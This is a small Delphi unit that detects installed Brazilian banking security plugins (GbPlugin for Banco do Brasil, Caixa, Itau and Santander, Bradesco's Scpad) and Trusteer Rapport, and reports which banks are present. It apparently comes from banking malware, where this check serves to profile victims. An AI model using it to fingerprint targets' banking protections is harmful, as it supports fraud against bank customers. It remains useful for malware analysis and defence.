unit uGB;

interface

Uses
  Windows, ShellAPI, SysUtils, Registry, INIFiles, SHFolder;

function GbExists: string;



implementation

//uses uPCFuncs;

function GetProgramFilesDir: string;
var
  Reg: TRegistry;
begin
  Reg := TRegistry.Create;
  try
    Reg.RootKey := HKEY_LOCAL_MACHINE;
    Reg.OpenKey('SOFTWARE\Microsoft\Windows\CurrentVersion', false);
    Result := Reg.ReadString('ProgramFilesDir');
  finally
    Reg.Free;
  end;
end;

function GbExists: string;
begin
  if FileExists(GetProgramFilesDir+'\GbPlugin\gbieh.dll') then
    Result := 'Banco do Brasil';
  if FileExists(GetProgramFilesDir +'\GbPlugin\gbiehcef.dll') then
    if Result <> '' then
      Result := Result+', Caixa'
    else
      Result := 'Caixa';
  if FileExists(GetProgramFilesDir + '\GbPlugin\gbiehuni.dll') then
    if Result <> '' then
      Result := Result+', Itau'
    else
      Result := 'Itau';
  if FileExists(GetProgramFilesDir +'\GbPlugin\gbiehabn.dll') then
    if Result <> '' then
      Result := Result+', Santander'
    else
      Result := 'Santander';

       if FileExists(GetProgramFilesDir +'\Scpad\scpVista.exe') then
      Result := 'Bradesco';

       if FileExists(GetProgramFilesDir +'\Trusteer\Rapport\bin\RapportService.exe') then
      Result := 'Trusteer Rapport';

  if Result = '' then

   Result := 'Sem Plugin';

end;

end.
